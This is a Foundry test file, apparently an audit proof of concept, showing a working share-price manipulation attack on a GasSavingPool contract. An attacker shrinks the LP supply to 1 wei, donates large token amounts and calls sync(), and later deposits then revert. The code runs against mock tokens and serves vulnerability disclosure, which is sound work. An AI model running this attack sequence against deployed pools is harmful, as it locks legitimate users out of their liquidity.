// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

import {Test, console} from "forge-std/Test.sol";
import {GSP} from "../../contracts/GasSavingPool/impl/GSP.sol";
import {MockERC20} from "../../contracts/mock/MockERC20.sol";

/**
 * @title ExploitTest - PoC for Share Price Manipulation DOS Attack
 * @notice This test demonstrates a critical vulnerability where an attacker can manipulate
 *         the share price during pool initialization to cause a DOS on subsequent buyShares operations.
 *
 * VULNERABILITY DESCRIPTION:
 * The GSPFunding contract allows an attacker to exploit the initial share minting mechanism
 * to make the LP token extremely expensive, preventing legitimate users from depositing.
 *
 * ATTACK STEPS:
 * 1. Attacker deposits minimal amounts (1001 wei each) to mint 1001 shares during initialization
 * 2. Attacker immediately sells back 1000 shares, keeping only 1 wei of shares (totalSupply = 1)
 * 3. Attacker donates large amounts (1000e18) of base and quote tokens to the pool
 * 4. Attacker calls sync() to update reserves to the inflated amounts
 * 5. When legitimate users try to buyShares with reasonable amounts, the transaction reverts
 *    because the calculated shares < 1001 (required minimum in _mint function)
 *
 * ROOT CAUSE:
 * - Initial share calculation uses minimum of base/quote balance without protection
 * - No minimum liquidity lock mechanism (like Uniswap V2's MINIMUM_LIQUIDITY)
 * - _mint() requires shares > 1000, but attacker can reduce totalSupply to 1 wei
 * - mintRatio calculation: shares = totalSupply * (userInput / reserves)
 * - With totalSupply = 1 and inflated reserves, shares will be < 1001 unless user deposits > 1001x reserves
 */
contract ExploitTest is Test {
    GSP public gsp;
    MockERC20 public baseToken;
    MockERC20 public quoteToken;

    address public attacker = address(0xBAD);
    address public victim = address(0x1234);
    address public maintainer = address(0x9999);

    function setUp() public {
        // Deploy mock tokens
        baseToken = new MockERC20("Base Token", "BASE", 18);
        quoteToken = new MockERC20("Quote Token", "QUOTE", 18);

        // Deploy and initialize GSP pool
        gsp = new GSP();
        gsp.init(
            maintainer,
            address(baseToken),
            address(quoteToken),
            0, // LP fee rate
            10000000000000, // MT fee rate
            1e18, // i (price ratio 1:1)
            500000000000000, // k
            false // isOpenTWAP
        );

        // Fund attacker with tokens for the attack
        // Attacker needs: 1001 wei for initial deposit + 1000e18 for donation
        baseToken.mint(attacker, 1001 + 1000e18);
        quoteToken.mint(attacker, 1001 + 1000e18);

        // Fund victim with reasonable amounts for normal deposit
        baseToken.mint(victim, 100e18);
        quoteToken.mint(victim, 100e18);
    }

    /**
     * @notice Demonstrates the share price manipulation attack leading to DOS
     * @dev This test proves that after the attack, legitimate users cannot deposit
     */
    function test_SharePriceManipulationDOS() public {
        console.log("=== Starting Share Price Manipulation Attack ===");

        // ============================================
        // STEP 1: Attacker initializes pool with minimal deposit (1001 wei each)
        // ============================================
        vm.startPrank(attacker);

        // Transfer minimal amounts to initialize the pool
        baseToken.transfer(address(gsp), 1001);
        quoteToken.transfer(address(gsp), 1001);

        console.log("\n[STEP 1] Attacker deposits 1001 wei of each token");
        console.log("Base token balance in pool:", baseToken.balanceOf(address(gsp)));
        console.log("Quote token balance in pool:", quoteToken.balanceOf(address(gsp)));

        // Buy shares - this is the initial deposit
        gsp.buyShares(attacker);

        uint256 attackerShares = gsp.balanceOf(attacker);
        uint256 totalSupplyAfterInit = gsp.totalSupply();

        console.log("Attacker shares minted:", attackerShares);
        console.log("Total supply:", totalSupplyAfterInit);
        console.log("Base reserve:", gsp._BASE_RESERVE_());
        console.log("Quote reserve:", gsp._QUOTE_RESERVE_());

        // Verify attacker received shares (should be 1001 based on min of base/quote)
        assertEq(attackerShares, 1001, "Initial shares should be 1001");

        // ============================================
        // STEP 2: Attacker sells back 1000 shares, keeping only 1 wei
        // ============================================
        console.log("\n[STEP 2] Attacker sells 1000 shares, keeping 1 wei");

        // Sell 1000 shares, keeping 1 wei of shares
        uint256 sharesToSell = 1000;
        gsp.sellShares(sharesToSell, attacker, 0, 0, "", block.timestamp);

        uint256 attackerSharesAfterSell = gsp.balanceOf(attacker);
        uint256 totalSupplyAfterSell = gsp.totalSupply();

        console.log("Attacker shares after sell:", attackerSharesAfterSell);
        console.log("Total supply after sell:", totalSupplyAfterSell);
        console.log("Base reserve after sell:", gsp._BASE_RESERVE_());
        console.log("Quote reserve after sell:", gsp._QUOTE_RESERVE_());

        // Verify totalSupply is now 1 wei
        assertEq(totalSupplyAfterSell, 1, "Total supply should be 1 wei after selling");
        assertEq(attackerSharesAfterSell, 1, "Attacker should have 1 wei of shares");

        // ============================================
        // STEP 3: Attacker donates large amounts to inflate reserves
        // ============================================
        console.log("\n[STEP 3] Attacker donates large amounts to inflate reserves");

        // Donate 1000e18 of each token
        baseToken.transfer(address(gsp), 1000e18);
        quoteToken.transfer(address(gsp), 1000e18);

        console.log("Base token donated:", 1000e18);
        console.log("Quote token donated:", 1000e18);

        // ============================================
        // STEP 4: Attacker calls sync() to update reserves
        // ============================================
        console.log("\n[STEP 4] Attacker calls sync() to update reserves");

        gsp.sync();

        uint256 baseReserveAfterDonation = gsp._BASE_RESERVE_();
        uint256 quoteReserveAfterDonation = gsp._QUOTE_RESERVE_();

        console.log("Base reserve after sync:", baseReserveAfterDonation);
        console.log("Quote reserve after sync:", quoteReserveAfterDonation);
        console.log("Total supply (still):", gsp.totalSupply());

        vm.stopPrank();

        // ============================================
        // STEP 5: Victim tries to deposit reasonable amounts - TRANSACTION REVERTS
        // ============================================
        console.log("\n[STEP 5] Victim attempts to deposit 10 tokens of each");

        vm.startPrank(victim);

        uint256 victimBaseDeposit = 10e18;
        uint256 victimQuoteDeposit = 10e18;

        baseToken.transfer(address(gsp), victimBaseDeposit);
        quoteToken.transfer(address(gsp), victimQuoteDeposit);

        console.log("Victim base token deposit:", victimBaseDeposit);
        console.log("Victim quote token deposit:", victimQuoteDeposit);

        // Calculate what shares would be minted (for demonstration)
        // mintRatio = min(baseInput/baseReserve, quoteInput/quoteReserve)
        // shares = totalSupply * mintRatio
        // With totalSupply = 1, baseReserve = ~1000e18, baseInput = 10e18
        // mintRatio = 10e18 / 1000e18 = 0.01 (in decimal math, this is 10e15 in 18 decimal representation)
        // shares = 1 * 0.01 = 0.01 wei (much less than required 1001)

        console.log("\nExpected calculation:");
        console.log("mintRatio (approx) = userInput / reserves = 10 / 1000 = 0.01");
        console.log("shares = totalSupply * mintRatio = 1 * 0.01 = 0.01 wei");
        console.log("Required minimum shares for _mint(): 1001");
        console.log("Result: REVERT with 'MINT_AMOUNT_NOT_ENOUGH'");

        // This should revert with "MINT_AMOUNT_NOT_ENOUGH" because calculated shares < 1001
        vm.expectRevert("MINT_AMOUNT_NOT_ENOUGH");
        gsp.buyShares(victim);

        vm.stopPrank();

        console.log("\n=== ATTACK SUCCESSFUL: DOS Achieved ===");
        console.log("Victim cannot deposit funds into the pool!");
        console.log("Pool is effectively bricked for normal users.");

        // ============================================
        // VERIFICATION: Even large deposits will fail unless > 1001x reserves
        // ============================================
        console.log("\n[VERIFICATION] Even 100 token deposit fails");

        vm.startPrank(victim);

        // Try with larger amount (100 tokens each)
        baseToken.transfer(address(gsp), 90e18); // Already sent 10, send 90 more
        quoteToken.transfer(address(gsp), 90e18);

        // mintRatio = 100 / 1000 = 0.1
        // shares = 1 * 0.1 = 0.1 wei (still < 1001)
        vm.expectRevert("MINT_AMOUNT_NOT_ENOUGH");
        gsp.buyShares(victim);

        vm.stopPrank();

        console.log("100 token deposit also fails!");
        console.log("\nTo successfully deposit, user would need > 1001 * 1000 = 1,001,000 tokens");
        console.log("This makes the pool economically unusable for normal users.");
    }
}
